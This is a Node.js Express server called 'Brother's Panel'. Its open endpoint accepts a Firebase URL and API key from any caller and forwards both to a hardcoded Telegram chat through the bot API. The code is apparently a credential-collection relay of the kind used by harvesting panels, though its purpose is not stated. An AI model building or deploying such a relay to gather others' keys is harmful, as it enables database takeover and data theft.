const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: "1mb" }));

/* =========================
   TELEGRAM CONFIG
========================= */

const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN;

const TELEGRAM_CHAT_ID =
  "1004480783091";


/* =========================
   TELEGRAM SEND
========================= */

async function sendTelegramMessage(message) {

  if (!TELEGRAM_BOT_TOKEN) {
    console.error("Telegram bot token is missing.");

    return {
      success: false,
      error: "Bot token is not configured"
    };
  }

  try {

    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "HTML"
        })
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {

      console.error(
        "Telegram API error:",
        data
      );

      return {
        success: false,
        error: "Telegram API request failed"
      };
    }

    return {
      success: true
    };

  } catch (error) {

    console.error(
      "Telegram request error:",
      error
    );

    return {
      success: false,
      error: "Telegram connection failed"
    };
  }
}


/* =========================
   FIREBASE CONNECTED
========================= */

app.post(
  "/api/firebase-connected",
  async (req, res) => {

    try {

      const {
        event,
        firebaseUrl,
        apiKey,
        time
      } = req.body;


      if (event !== "firebase_connected") {

        return res.status(400).json({
          success: false,
          error: "Invalid event"
        });
      }


      if (!firebaseUrl) {

        return res.status(400).json({
          success: false,
          error: "Firebase URL is required"
        });
      }


      const message =
`<b>🔥 Brother's Panel</b>

<b>Firebase Connected</b>

<b>Firebase URL:</b>
<code>${escapeTelegramHtml(firebaseUrl)}</code>

<b>API Key:</b>
<code>${escapeTelegramHtml(apiKey || "Not provided")}</code>

<b>Time:</b>
<code>${escapeTelegramHtml(time || new Date().toISOString())}</code>`;


      const telegram =
        await sendTelegramMessage(message);


      return res.json({
        success: true,
        telegramSent: telegram.success
      });


    } catch (error) {

      console.error(
        "Firebase notification error:",
        error
      );

      return res.status(500).json({
        success: false,
        error: "Server error"
      });
    }

  }
);


/* =========================
   TELEGRAM HTML ESCAPE
========================= */

function escapeTelegramHtml(value) {

  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}


/* =========================
   HEALTH CHECK
========================= */

app.get("/", (req, res) => {

  res.json({
    success: true,
    app: "Brother's Panel Backend",
    version: "1.0.0",
    status: "online"
  });

});


app.get("/health", (req, res) => {

  res.json({
    success: true,
    status: "healthy",
    uptime: process.uptime()
  });

});


/* =========================
   START SERVER
========================= */

app.listen(PORT, () => {

  console.log(
    `Brother's Panel Backend running on port ${PORT}`
  );

});
